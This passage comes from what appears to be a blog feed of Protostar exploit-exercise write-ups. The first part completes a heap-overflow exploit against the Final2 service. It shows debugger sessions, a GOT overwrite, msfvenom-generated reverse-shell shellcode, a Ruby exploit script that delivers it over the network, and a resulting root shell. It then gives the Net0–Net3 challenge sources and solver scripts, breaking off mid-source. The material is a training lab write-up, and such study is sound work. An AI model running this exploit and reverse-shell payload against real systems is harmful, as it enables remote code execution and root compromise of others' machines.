2nd chunk: &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + &ldquo;X&rdquo; * 103
3rd chunk: &ldquo;XXXX&rdquo;
{% endcodeblock %}</p>

<p>In this case we copy everything after <code>ROOT/</code> to the 1st chunk and overwrite the chunk metadata, so we have classic heap overflow.</p>

<p>To verify our concept, we attach to the final2 process as root user:</p>

<p>{% codeblock %}</p>

<h1>window 1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;0&rdquo; * 123 +&ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + &ldquo;AAAABBBB&rdquo; + &ldquo;X&rdquo; * 107&rsquo; | nc 0 2993</p>

<h1>window 1:</h1>

<p>[New process 2405]</p>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2405]
_______________________________________Current language:  auto
The current source language is &ldquo;auto; currently c&rdquo;.</p>

<hr />

<pre><code> eax:41414141 ebx:B7FD7FF4  ecx:0804C2D6  edx:42424242     eflags:00010246
 esi:00000000 edi:00000000  esp:BFFFF7E0  ebp:BFFFF828     eip:0804AAEF
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t s Z a P c 
</code></pre>

<p>[007B:BFFFF7E0]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF810 : 42 42 42 42  41 41 41 41 - 18 E1 04 08  18 E1 04 08 BBBBAAAA&hellip;&hellip;..
BFFFF800 : 88 E0 04 08  FC FF FF FF - 00 00 00 00  10 E1 04 08 &hellip;&hellip;&hellip;&hellip;&hellip;.
BFFFF7F0 : 00 D5 04 08  00 E0 04 08 - 88 00 00 00  45 BD 04 08 &hellip;&hellip;&hellip;&hellip;E&hellip;
BFFFF7E0 : 00 00 00 00  00 00 00 00 - 28 F8 FF BF  68 B5 04 08 &hellip;&hellip;..(&hellip;h&hellip;
[007B:41414141]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
41414141 : Error while running hook_stop:
Cannot access memory at address 0x41414141
0x0804aaef in free (mem=0x804e008) at final2/../common/malloc.c:3648
3648    final2/../common/malloc.c: No such file or directory.
    in final2/../common/malloc.c</p>

<p>gdb> i r eax edx
eax            0x41414141   0x41414141
edx            0x42424242   0x42424242</p>

<p>gdb> x /i $eip
0x804aaef &lt;free+301>:   mov    DWORD PTR [eax+0xc],edx</p>

<p>gdb> x /50x 0x804e010
0x804e010:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e020:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e030:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e040:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e050:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e060:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e070:  0x30303030  0x30303030  0x30303030  0x30303030
0x804e080:  0x30303030  0x2f303030  0xfffffff8  0xfffffffc
0x804e090:  0x41414141  0x42424242  0x58585858  0x58585858
0x804e0a0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0b0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0c0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0d0:  0x58585858  0x58585858</p>

<p>{% endcodeblock %}</p>

<p>We use <code>GOT</code> technique, modifing <code>write</code> and the shellcode will be stored in our first chunk (<code>0x804e010</code>).</p>

<p>{% codeblock %}
root@protostar:/tmp# objdump -TR /opt/protostar/bin/final2 | grep &ldquo;R_386_JUMP_SLOT.* write&rdquo;
0804d41c R_386_JUMP_SLOT   write</p>

<p>(gdb) print /x 0x0804d41c-0x0c
$1 = 0x804d410
{% endcodeblock %}</p>

<p>So we need to write <code>0x804e010</code> to <code>0x804d41c</code>.</p>

<p>To check where are usable data in our buffer, we use metasploit pattern:</p>

<p>{% codeblock %}</p>

<h1>window 1:</h1>

<p>root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0&rdquo; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; * 107&rsquo; | nc 0 2993</p>

<h1>window 1:</h1>

<p>Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2427]</p>

<hr />

<pre><code> eax:B7FFEFF4 ebx:B7FE1848  ecx:FFFFFFFF  edx:0013F1CC     eflags:00010286
 esi:BFFFF91C edi:00000001  esp:BFFFF8AC  ebp:B7FEBFC6     eip:0804E026
 cs:0073  ds:007B  es:007B  fs:0000  gs:0033  ss:007B    o d I t S z a P c 
</code></pre>

<p>[007B:BFFFF8AC]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[stack]
BFFFF8DC : FA 90 04 08  FC F8 FF BF - 05 00 00 00  00 00 00 00 &hellip;&hellip;&hellip;&hellip;&hellip;.
BFFFF8CC : 11 00 20 01  00 00 00 00 - 28 67 E9 B7  08 F9 FF BF .. &hellip;..(g&hellip;&hellip;
BFFFF8BC : B0 FA FF B7  A7 D8 F2 B7 - 01 00 00 00  01 00 00 00 &hellip;&hellip;&hellip;&hellip;&hellip;.
BFFFF8AC : E7 88 04 08  01 00 00 00 - F0 F8 FF BF  26 06 FF B7 &hellip;&hellip;&hellip;&hellip;&amp;&hellip;
[007B:BFFFF91C]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ data]
BFFFF91C : 7B 00 00 00  7B 00 00 00 - 28 67 E9 B7  00 00 00 00 {&hellip;{&hellip;(g&hellip;&hellip;
BFFFF92C : 18 FC FF BF  EC FB FF BF - 11 00 20 01  00 00 00 00 &hellip;&hellip;&hellip;. &hellip;..
[0073:0804E026]&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;[ code]
0x804e026:  cmp    BYTE PTR [ecx+0x61],al
0x804e029:  cmp    DWORD PTR [ecx+0x62],eax
0x804e02c:  xor    BYTE PTR [ecx+0x62],al
0x804e02f:  xor    DWORD PTR [ecx+0x62],eax
0x804e032:  xor    al,BYTE PTR [ecx+0x62]</p>

<h2>0x804e035:  xor    eax,DWORD PTR [ecx+0x62]</h2>

<p>0x0804e026 in ?? ()</p>

<p>gdb> x /50x 0x804e010
0x804e010:  0x61413161  0x33614132  0x0804d410  0x61413561
0x804e020:  0x37614136  0x41386141  0x62413961  0x31624130
0x804e030:  0x41326241  0x62413362  0x35624134  0x41367241
0x804e040:  0x62413762  0x39624138  0x41306341  0x63413163
0x804e050:  0x33634132  0x41346341  0x63413563  0x37634136
0x804e060:  0x41386341  0x64413963  0x3584d130  0x41326449
0x804e070:  0x64413364  0x35644134  0x41366441  0x64413764
0x804e080:  0x39644138  0x00000084  0xfffffff8  0xfffffffc
0x804e090:  0x0804d410  0x0804e010  0x58585858  0x58585858
0x804e0a0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0b0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0c0:  0x58585858  0x58585858  0x58585858  0x58585858
0x804e0d0:  0x58585858  0x58585858
{% endcodeblock %}</p>

<p>{% codeblock %}
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413161
[<em>] Exact match at offset 4
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x61413561
[</em>] Exact match at offset 16
root@kali32:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 0x39644138
[*] Exact match at offset 116
{% endcodeblock %}</p>

<p>Our code starts at pattern offset <code>4</code>. There is also modification in the first <code>12</code> bytes, we use <code>2</code> bytes instruction and skip next <code>10</code> bytes, using <code>\xeb\x0a</code> opcode.</p>

<p>After another segfault, we have in gdb:
{% codeblock %}
root@protostar:/tmp# gdb -q -ex &lsquo;set disassembly-flavor intel&rsquo; -ex &lsquo;set follow-fork-mode child&rsquo; -ex &lsquo;set detach-on-fork off&rsquo; -x /home/user/.gdbinit -ex &lsquo;c&rsquo; -p 1627</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + &ldquo;a5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0&rdquo; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993</p>

<p>gdb> x /i 0x804e010
0x804e010:  jmp    0x804e01c</p>

<p>gdb> x /30x 0x804e01c
0x804e01c:  0x61413561  0x37614136  0x41386141  0x62413961
0x804e02c:  0x31624130  0x41326241  0x62413362  0x35624134
0x804e03c:  0x41366241  0x62413762  0x39624138  0x41306341
0x804e04c:  0x63413163  0x33634132  0x41346341  0x63413563
0x804e05c:  0x37634136  0x41386341  0x64413963  0x31644130
0x804e06c:  0x41326441  0x64413364  0x35644134  0x41366441
0x804e07c:  0x64413764  0x39644138  0x00000084  0xfffffff8
0x804e08c:  0xfffffffc  0x0804d410</p>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + &ldquo;D&rdquo; * 107&#8221; + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993</p>

<p>gdb> x /30x 0x804e01c
0x804e01c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e02c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e03c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e04c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e05c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e06c:  0x44444444  0x44444444  0x44444444  0x44444444
0x804e07c:  0x44444444  0x44444444  0x00000084  0xfffffff8
0x804e08c:  0xfffffffc  0x0804d410
{% endcodeblock %}</p>

<p>We can see above, that we have <code>26*4=104</code> bytes for our shellcode.</p>

<p>Exploitation:
{% codeblock %}</p>

<h1>window 1:</h1>

<h1>we add 0x5c = &lsquo;/&rsquo; to our bad chars list</h1>

<p>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &lsquo;\x0a\x0d\x5c\x00&rsquo; -f sh
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 22 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
Payload size: 95 bytes
export buf=\
$&lsquo;\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9&rsquo;\
$&lsquo;\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb&rsquo;\
$&lsquo;\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f&rsquo;\
$&lsquo;\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16&rsquo;\
$&lsquo;\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6&rsquo;\
$&lsquo;\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8&rsquo;\
$&lsquo;\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62&rsquo;</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ export buf=\</p>

<blockquote><p>$&lsquo;\xb8\x23\x99\xa0\xea\xdd\xc0\xd9\x74\x24\xf4\x5f\x2b\xc9&rsquo;\
$&lsquo;\xb1\x12\x31\x47\x12\x03\x47\x12\x83\xe4\x9d\x42\x1f\xdb&rsquo;\
$&lsquo;\x46\x75\x03\x48\x3a\x29\xae\x6c\x35\x2c\x9e\x16\x88\x2f&rsquo;\
$&lsquo;\x4c\x8f\xa2\x0f\xbe\xaf\x8a\x16\xb9\xc7\x73\xe9\x39\x16&rsquo;\
$&lsquo;\xe4\xeb\x39\x1d\xcd\x62\xd8\xad\x4b\x25\x4a\x9e\x20\xc6&rsquo;\
$&lsquo;\xe5\xc1\x8a\x49\xa7\x69\x3a\x65\x3b\x01\x2c\x56\xd9\xb8&rsquo;\
$&lsquo;\xc2\x21\xfe\x68\x48\xbb\xe0\x3c\x65\x76\x62&rsquo;</p></blockquote>

<h1>window 3:</h1>

<p>user@protostar:~$ nc -l -p 1337</p>

<h1>window 2:</h1>

<p>user@protostar:/tmp$ ruby -e &lsquo;print &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + ENV[&ldquo;buf&rdquo;] + &ldquo;D&rdquo; * (107 - ENV[&ldquo;buf&rdquo;].length) + &ldquo;/&rdquo; + &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  107&rsquo; | nc 0 2993
Process OK</p>

<h1>window 3:</h1>

<p>id
uid=0(root) gid=0(root) groups=0(root)
{% endcodeblock %}</p>

<p>{% codeblock lang:ruby exploit-final2.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<h1>user@protostar:~$ objdump -TR /opt/protostar/bin/final2 | grep &ldquo;R_386_JUMP_SLOT.* write&rdquo;</h1>

<h1>0804d41c R_386_JUMP_SLOT   write</h1>

<h1>gdb> print /x 0x0804d41c-0xc</h1>

<h1>$1 = 0x804d410</h1>

<h1>root@protostar:/tmp# ltrace  -e memset -f /opt/protostar/bin/final2</h1>

<h1>[pid 2803] +++ exited (status 0) +++</h1>

<h1>[pid 2804] memset(0xbffff71c, &lsquo;\000&rsquo;, 16)     = 0xbffff71c</h1>

<h1>[pid 2807] memset(0x0804e008, &lsquo;\000&rsquo;, 132)    = 0x0804e008 &lt;= first chunk</h1>

<h1>[pid 2807] memset(0x0804e090, &lsquo;\000&rsquo;, 132)    = 0x0804e090 &lt;= second chunk</h1>

<h1>[pid 2807] memset(0x0804e118, &lsquo;\000&rsquo;, 132)    = 0x0804e118 &lt;= third chunk</h1>

<h1>root@kali32:~# ruby -e &lsquo;puts &ldquo;0x&rdquo;+(0x0804e008+&ldquo;FSDRAa0A&rdquo;.length).to_s(16)&rsquo;</h1>

<h1>0x804e010</h1>

<h1>root@kali32:~# /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1337 -b &lsquo;\x0a\x0d\x5c\x00&rsquo; -f ruby</h1>

<h1>No platform was selected, choosing Msf::Module::Platform::Linux from the payload</h1>

<h1>No Arch selected, selecting Arch: x86 from the payload</h1>

<h1>Found 22 compatible encoders</h1>

<h1>Attempting to encode payload with 1 iterations of x86/shikata_ga_nai</h1>

<h1>x86/shikata_ga_nai succeeded with size 95 (iteration=0)</h1>

<h1>Payload size: 95 bytes</h1>

<p>buf =
&ldquo;\xbf\x9e\x53\x7d\x18\xda\xc5\xd9\x74\x24\xf4\x5e\x33\xc9&rdquo; +
&ldquo;\xb1\x12\x31\x7e\x12\x83\xee\xfc\x03\xe0\x5d\x9f\xed\x2d&rdquo; +
&ldquo;\xb9\xa8\xed\x1e\x7e\x04\x98\xa2\x09\x4b\xec\xc4\xc4\x0c&rdquo; +
&ldquo;\x9e\x51\x67\x33\x6c\xe1\xce\x35\x97\x89\xaf\xc5\x67\x48&rdquo; +
&ldquo;\x38\xc4\x67\x4f\x81\x41\x86\xff\x97\x01\x18\xac\xe4\xa1&rdquo; +
&ldquo;\x13\xb3\xc6\x26\x71\x5b\xf6\x09\x05\xf3\x60\x79\x8b\x6a&rdquo; +
&ldquo;\x1f\x0c\xa8\x3e\x8c\x87\xce\x0e\x39\x55\x90&rdquo;</p>

<p>chunk1 = &ldquo;FSRD&rdquo; + &ldquo;Aa0A&rdquo; + &ldquo;\xeb\x0a&rdquo; + &ldquo;X&rdquo; * 10 + buf + &ldquo;D&rdquo; * (107 - buf.length) + &ldquo;/&rdquo;
chunk2 = &ldquo;FSRD&rdquo; + &ldquo;ROOT/&rdquo; + [0xfffffff8].pack(&ldquo;V&rdquo;) + [0xfffffffc].pack(&ldquo;V&rdquo;) + [0x804d410].pack(&ldquo;V&rdquo;) + [0x804e010].pack(&ldquo;V&rdquo;) + &ldquo;X&rdquo; *  103
chunk3 = &ldquo;DDDD&rdquo;</p>

<p>exploit = chunk1 + chunk2 + chunk3</p>

<p>host = ARGV[0]
host ||= &ldquo;192.168.80.154&rdquo;</p>

<p>puts &ldquo;Using host: #{host}&rdquo;</p>

<p>s = TCPSocket.new host, 2993
s.puts(exploit)
s.close
{% endcodeblock %}</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Exploit-Exercises: Protostar (Net Levels)]]></title>
    <link href="http://73696e65.github.io/blog/2015/07/05/exploit-exercises-protostar-net-levels/"/>
    <updated>2015-07-05T06:21:02+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/07/05/exploit-exercises-protostar-net-levels</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/">Exploit-Exercises: Protostar (v2)</a></p>

<p>{% codeblock %}
user@protostar:~$ wget <a href="https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt">https://raw.githubusercontent.com/73696e65/gdbinit/master/gdb_init.txt</a> &ndash;no-check-certificate -O ~/.gdbinit -q
{% endcodeblock %}</p>

<h2>Protostar Net0</h2>

<p>{% codeblock lang:c net0.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>define NAME &ldquo;net0&rdquo;</h1>

<h1>define UID 999</h1>

<h1>define GID 999</h1>

<h1>define PORT 2999</h1>

<p>void run()
{
  unsigned int i;
  unsigned int wanted;</p>

<p>  wanted = random();</p>

<p>  printf(&ldquo;Please send &lsquo;%d&rsquo; as a little endian 32bit int\n&rdquo;, wanted);</p>

<p>  if(fread(&amp;i, sizeof(i), 1, stdin) == NULL) {
      errx(1, &ldquo;:(\n&rdquo;);
  }</p>

<p>  if(i == wanted) {
      printf(&ldquo;Thank you sir/madam\n&rdquo;);
  } else {
      printf(&ldquo;I&rsquo;m sorry, you sent %d instead\n&rdquo;, i);
  }
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  /<em> Don&rsquo;t do this :> </em>/
  srandom(time(NULL));</p>

<p>  run();
}
{% endcodeblock %}</p>

<p>Converting strings to little endian integers. Solution:</p>

<p>{% codeblock lang:ruby net0.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<p>host = &ldquo;127.0.0.1&rdquo;
port = 2999</p>

<p>s = TCPSocket.new host, port
while line = s.gets
        puts line
        n = [Integer(line.scan(/\d+/).first)].pack(&ldquo;V&rdquo;)
        s.send n, 0
        s.flush
end
s.close
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ./net0.rb
Please send &lsquo;1690508608&rsquo; as a little endian 32bit int
Thank you sir/madam
{% endcodeblock %}</p>

<h2>Protostar Net1</h2>

<p>{% codeblock lang:c net1.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>define NAME &ldquo;net1&rdquo;</h1>

<h1>define UID 998</h1>

<h1>define GID 998</h1>

<h1>define PORT 2998</h1>

<p>void run()
{
  char buf[12];
  char fub[12];
  char *q;</p>

<p>  unsigned int wanted;</p>

<p>  wanted = random();</p>

<p>  sprintf(fub, &ldquo;%d&rdquo;, wanted);</p>

<p>  if(write(0, &amp;wanted, sizeof(wanted)) != sizeof(wanted)) {
      errx(1, &ldquo;:(\n&rdquo;);
  }</p>

<p>  if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {
      errx(1, &ldquo;:(\n&rdquo;);
  }</p>

<p>  q = strchr(buf, &lsquo;\r&rsquo;); if(q) <em>q = 0;
  q = strchr(buf, &lsquo;\n&rsquo;); if(q) </em>q = 0;</p>

<p>  if(strcmp(fub, buf) == 0) {
      printf(&ldquo;you correctly sent the data\n&rdquo;);
  } else {
      printf(&ldquo;you didn&rsquo;t send the data properly\n&rdquo;);
  }
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  /<em> Don&rsquo;t do this :> </em>/
  srandom(time(NULL));</p>

<p>  run();
}
{% endcodeblock %}</p>

<p>Another easy challenge, we need to convert binary integers to string. Solution:</p>

<p>{% codeblock lang:ruby net1.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<p>host = &ldquo;127.0.0.1&rdquo;
port = 2998</p>

<p>s = TCPSocket.new host, port</p>

<p>x = s.recv(4).unpack(&lsquo;I&rsquo;).first.to_s
s.send x, 0</p>

<p>puts s.gets
s.close
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ./net1.rb
you correctly sent the data
{% endcodeblock %}</p>

<h2>Protostar Net2</h2>

<p>{% codeblock lang:c net2.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>define NAME &ldquo;net2&rdquo;</h1>

<h1>define UID 997</h1>

<h1>define GID 997</h1>

<h1>define PORT 2997</h1>

<p>void run()
{
  unsigned int quad[4];
  int i;
  unsigned int result, wanted;</p>

<p>  result = 0;
  for(i = 0; i &lt; 4; i++) {
      quad[i] = random();
      result += quad[i];</p>

<pre><code>  if(write(0, &amp;(quad[i]), sizeof(result)) != sizeof(result)) {
      errx(1, ":(\n");
  }
</code></pre>

<p>  }</p>

<p>  if(read(0, &amp;wanted, sizeof(result)) != sizeof(result)) {
      errx(1, &ldquo;:&lt;\n&rdquo;);
  }</p>

<p>  if(result == wanted) {
      printf(&ldquo;you added them correctly\n&rdquo;);
  } else {
      printf(&ldquo;sorry, try again. invalid\n&rdquo;);
  }
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  /<em> Don&rsquo;t do this :> </em>/
  srandom(time(NULL));</p>

<p>  run();
}
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ nc 0 2997 | hexdump -C
00000000  85 9e e6 45 93 a9 db 61  6f 22 cd 4b 1d a0 cb 57  |&hellip;E&hellip;ao&#8221;.K&hellip;W|
{% endcodeblock %}</p>

<p>We need to add up 4 unsigned 32-bit integers. Solution:</p>

<p>{% codeblock lang:ruby net2.rb %}</p>

<h1>!/usr/bin/env ruby</h1>

<p>require &lsquo;socket&rsquo;</p>

<p>host = &ldquo;127.0.0.1&rdquo;
port = 2997</p>

<p>s = TCPSocket.new host, port
n = 0</p>

<p>4.times do
        n += s.recv(4).unpack(&lsquo;I&rsquo;).first
end
n = [n &amp; 0xffffffff].pack(&ldquo;V&rdquo;)
s.send n, 0</p>

<p>puts s.gets
s.close
{% endcodeblock %}</p>

<p>{% codeblock %}
user@protostar:/tmp$ ./net2.rb
you added them correctly
{% endcodeblock %}</p>

<h2>Protostar Net3</h2>

<p>{% codeblock lang:c net3.c %}</p>

<h1>include &ldquo;../common/common.c&rdquo;</h1>

<h1>define NAME &ldquo;net3&rdquo;</h1>

<h1>define UID 996</h1>

<h1>define GID 996</h1>

<h1>define PORT 2996</h1>

<p>/<em>
 * Extract a null terminated string from the buffer
 </em>/</p>

<p>int get_string(char <em>*result, unsigned char </em>buffer, u_int16_t len)
{
  unsigned char byte;</p>

<p>  byte = *buffer;</p>

<p>  if(byte > len) errx(1, &ldquo;badly formed packet&rdquo;);
  <em>result = malloc(byte);
  strcpy(</em>result, buffer + 1);</p>

<p>  return byte + 1;
}</p>

<p>/<em>
 * Check to see if we can log into the host
 </em>/</p>

<p>int login(unsigned char <em>buffer, u_int16_t len)
{
  char </em>resource, <em>username, </em>password;
  int deduct;
  int success;</p>

<p>  if(len &lt; 3) errx(1, &ldquo;invalid login packet length&rdquo;);</p>

<p>  resource = username = password = NULL;</p>

<p>  deduct = get_string(&amp;resource, buffer, len);
  deduct += get_string(&amp;username, buffer+deduct, len-deduct);
  deduct += get_string(&amp;password, buffer+deduct, len-deduct);</p>

<p>  success = 0;
  success |= strcmp(resource, &ldquo;net3&rdquo;);
  success |= strcmp(username, &ldquo;awesomesauce&rdquo;);
  success |= strcmp(password, &ldquo;password&rdquo;);</p>

<p>  free(resource);
  free(username);
  free(password);</p>

<p>  return ! success;
}</p>

<p>void send_string(int fd, unsigned char byte, char *string)
{
  struct iovec v[3];
  u_int16_t len;
  int expected;</p>

<p>  len = ntohs(1 + strlen(string));</p>

<p>  v[0].iov_base = &len;
  v[0].iov_len = sizeof(len);</p>

<p>  v[1].iov_base = &byte;
  v[1].iov_len = 1;</p>

<p>  v[2].iov_base = string;
  v[2].iov_len = strlen(string);</p>

<p>  expected = sizeof(len) + 1 + strlen(string);</p>

<p>  if(writev(fd, v, 3) != expected) errx(1, &ldquo;failed to write correct amount of bytes&rdquo;);</p>

<p>}</p>

<p>void run(int fd)
{
  u_int16_t len;
  unsigned char *buffer;
  int loggedin;</p>

<p>  while(1) {
      nread(fd, &amp;len, sizeof(len));
      len = ntohs(len);
      buffer = malloc(len);</p>

<pre><code>  if(! buffer) errx(1, "malloc failure for %d bytes", len);

  nread(fd, buffer, len);

  switch(buffer[0]) {
      case 23:
          loggedin = login(buffer + 1, len - 1);
          send_string(fd, 33, loggedin ? "successful" : "failed");
          break;

      default:
          send_string(fd, 58, "what you talkin about willis?");
          break;
  }
</code></pre>

<p>  }
}</p>

<p>int main(int argc, char <strong>argv, char </strong>envp)
{
  int fd;
  char *username;</p>

<p>  /<em> Run the process as a daemon </em>/
  background_process(NAME, UID, GID);</p>

<p>  /<em> Wait for socket activity and return </em>/
  fd = serve_forever(PORT);</p>

<p>  /<em> Set the client socket to STDIN, STDOUT, and STDERR </em>/
  set_io(fd);</p>

<p>  /<em> Don&rsquo;t do this :> </em>/
  srandom(time(NULL));</p>

<p>  run(fd);
